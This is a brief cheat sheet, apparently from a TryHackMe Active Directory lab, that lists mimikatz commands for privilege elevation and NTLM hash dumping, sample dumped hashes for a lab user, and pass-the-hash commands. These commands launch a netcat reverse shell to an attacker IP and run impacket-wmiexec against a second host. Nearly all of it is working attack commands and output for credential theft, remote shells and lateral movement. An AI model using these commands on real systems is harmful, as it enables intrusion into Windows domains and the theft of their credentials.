# Dump NTLM Hashes
```
# Check priv end elevate
privilege::debug
token::elevate

# Dump hashes
sekurlsa::msv

# Output of msv
        msv :              
         [00000003] Primary  
         * Username : t1_toby.beck3
         * Domain   : ZA 
         * NTLM     : 533f1bd576caa912bdb9da284bbc60fe
         * SHA1     : 8a65216442debb62a3258eea4fbcbadea40ccc38          
         * DPAPI    : 20fa99221aff152851ce37bcd510e61e           
```

# Pass the hash to kali box nc listener
```

sekurlsa::pth /user:<user> /domain:ZA /ntlm:<ntlm hash> /run:"c:\tools\nc64.eze -e cmd.exe <attacker ip> <port>"

sekurlsa::pth /user:t1_toby.beck /domain:ZA /ntlm:533f1bd576caa912bdb9da284bbc60fe /run:"c:\tools\nc64.exe -e cmd.exe 10.50.77.64 5555"
```

# Pass the hash from kali to target 2
```
impacket-wmiexec -hashes ':533f1bd576caa912bdb9da284bbc60fe' 'za.tryhackme.com/t1_toby.beck@thmiis.za.tryhackme.com'
```

